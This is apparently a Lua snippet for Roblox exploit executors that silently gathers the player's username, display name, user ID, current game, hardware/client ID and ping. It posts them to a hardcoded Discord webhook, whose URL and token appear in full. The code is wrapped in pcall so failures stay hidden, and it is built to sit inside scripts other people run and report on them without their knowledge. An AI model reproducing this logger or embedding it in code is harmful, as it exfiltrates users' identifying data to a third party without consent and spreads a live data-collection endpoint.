local webh = "https://discordapp.com/api/webhooks/1041138127613480983/1_Id95opxezQ9izltqpFMXGFr-xdFMktdH4KSbYMyWSc_dWIIR7-7c_s4RTxUK9Ea1at"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'Script',
       ['description'] = 'Someone Executed your script here is their Information',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'DisplayName', value = game:GetService("Players").LocalPlayer.DisplayName},
          {name = "UserID", value = game:GetService("Players").LocalPlayer.UserId},
          {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)